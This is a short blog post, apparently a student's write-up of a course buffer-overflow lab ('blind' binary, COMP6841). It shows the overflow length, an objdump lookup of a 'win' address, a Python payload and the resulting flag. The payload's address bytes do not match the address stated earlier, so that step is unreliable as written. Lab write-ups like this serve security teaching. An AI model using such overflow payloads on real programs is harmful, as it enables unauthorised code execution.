---
title: "Buffer Overflow - 3"
date: 2019-07-12T03:16:59+10:00

categories: ["Extended Security", "Musings"]

hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

This time the code is hidden

Note, I originally attempted this with [commit #a798f95](https://github.com/secedu/COMP6841-exploitpractice/blob/55550815cf6ed1fded421c1f59b5310284900257/buffer_overflow/1.2-blind/blind). But since then there's been an updated version, available [here](https://github.com/secedu/COMP6841-exploitpractice/blob/master/buffer_overflow/1.2-blind/blind)

# Analysis

We'll need to find two things

1) The length of the buffer  
2) The function address of `win`

## Buffer Length

After an input of 76 characters, we get a segfault - so our `buffer` array is probably 76 characters. So later when we need to overflow the buffer, we will need to prepend 76 (arbitrary) characters.

## Function pointer address

As we don't have any code, we'll need to inspect the executable file to find the function pointer address.

```
$> objdump -d blind | grep win

---

080484d6 <win>:
```

Cool, so our address is at `0x080484d6`.  

Putting these together...

```
$> python -c 'print("A" * 76 + "\x06\x85\x04\x08")'  | aslr ./blind

---

This is almost exactly the same as jump...
COMP6841{Ooh_Youre_Good}Segmentation fault
```

<!-- hex(0x56555000 + 0x080484d6)
'0x5e59d4d6'

https://security.stackexchange.com/questions/197232/how-does-this-simple-buffer-overflow-work -->
